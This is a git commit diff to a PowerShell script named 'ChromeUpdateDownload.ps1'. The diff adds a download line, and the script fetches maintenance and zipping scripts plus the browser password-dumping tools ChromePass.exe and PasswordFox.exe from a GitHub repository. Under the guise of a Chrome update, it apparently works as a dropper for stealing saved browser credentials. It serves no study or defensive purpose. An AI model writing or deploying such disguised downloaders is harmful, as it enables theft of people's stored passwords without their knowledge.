f5c1a2cc3fa0aa6ac478770e7e293f4205f3bbed
abdulaziesmuslim <abdulazies55@gmail.com>
2020-06-06 09:38:39 +0700

    Update ChromeUpdateDownload.ps1

--- ChromeUpdateDownload.ps1
+++ ChromeUpdateDownload.ps1
@@ -1,3 +1,4 @@
 wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/maintenance.ps1 -OutFile maintenance.ps1
+wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/zipping.ps1 -OutFile zipping.ps1
 wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromePass.exe -OutFile ChromePass.exe
 wget https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/PasswordFox.exe -OutFile PasswordFox.exe
